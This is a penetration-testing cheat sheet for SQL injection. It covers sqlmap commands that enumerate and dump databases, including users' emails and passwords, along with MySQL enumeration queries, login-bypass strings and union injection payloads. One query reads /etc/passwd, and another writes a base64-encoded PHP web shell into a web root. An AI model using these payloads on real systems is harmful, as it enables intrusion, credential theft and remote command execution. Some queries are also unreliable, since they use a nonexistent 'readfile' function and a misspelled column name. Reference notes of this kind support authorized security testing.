# SQLi
 - [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## SQLMap
### Tips
- Copy the request as cURL in the devtools and change curl to sqlmap
- Save burp requests to text files and load them in sqlmap with `sqlmap -r request.txt`
### Don't ask for user input
```bash
sqlmap ... --batch
```
### Fingerprint
```bash
sqlmap ... --current-user --banner --current-db --is-dba
```
#### Enum everything at once
```bash
sqlmap ... --all --batch -v 0
```
#### Enum schema
```bash
sqlmap ... --schema
```
#### Enum dbs
```bash
sqlmap ... --dbs
```
#### Enum tables
```bash
sqlmap ... -D dbname --tables
```
#### Enum columns
```bash
sqlmap ... -D dbname -T users --columns
```
#### Search table by string
```bash
sqlmap ... --search -T something
```
#### Search column by string
```
sqlmap ... --search -C something
```
### Dump everything
```bash
sqlmap ... --dump-all
```
### Dump table contents
```bash
sqlmap ... --dump -D dbname -T users -C email,password
```
### Dump w/ filters
```bash
sqlmap ... --dump -D dbname -T users --where="email LIKE '%something%'" --start=1 --stop=15
```
### Send traffic through proxy
```bash
sqlmap ... --proxy http://127.0.0.1:8080
```
### Save traffic to file
```bash
sqlmap ... -t ./out.txt
```
### Verbosity
#### Show errors
```bash
sqlmap ... --parse-errors
```
#### Verbose output
```bash
# No info logs
sqlmap ... -v 0
```
```bash
# All payloads
sqlmap ... -v 3
```
### Tuning
```bash
sqlmap ... --level=5 --risk=3
```
```bash
sqlmap ... --union-cols=6 --union-char='A'
```
```bash
sqlmap ... --prefix="\`)" --suffix="-- +" 
```

## Mysql
- [payload all the things mysql](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
### Fingerprint
```sql
select @@version
select sleep(3)
```
#### Enum dbs
```sql
select schema_name from information_schema.schemata
```
#### Enum tables
```sql
select table_name,table_schame from information_schema.tables where table_schema='zzz'
```
#### Enum columns
```sql
select column_name,table_name from information_schema.columns where table_name='zzz' and table_schema='zzz'
```
#### Enum current user
```sql
select user();
```
#### Enum current user privileges
```sql
select grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'<user>'@'<host>'"
```
#### Enum current user write file
Check if value is empty for access, whereas NULL means no access.
```sql
select variable_name,variable_value from information_schema.global_variables where variable_name='secure_file_priv'
```
### Read file
```sql
select readfile('/etc/passwd')
```
### Write file
```sql
select from_base64("PD9waHAgc3lzdGVtKCRfUkVRVUVTVFswXSk7ID8+") into outfile '/var/www/html/pwn.php'
```
### Login bypass
```sql
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
```
### Some union injection examples
```sql
' union select 1,username,password,4,5,6 from db1.users;-- -
```
```sql
' union select 1,user(),3,4,5,6;-- -
```
```sql
' union select 1,sleep(3),3,4,5,6;-- -
```
```sql
' union select 1,readfile("/etc/passwd"),3,4,5,6;-- -
```
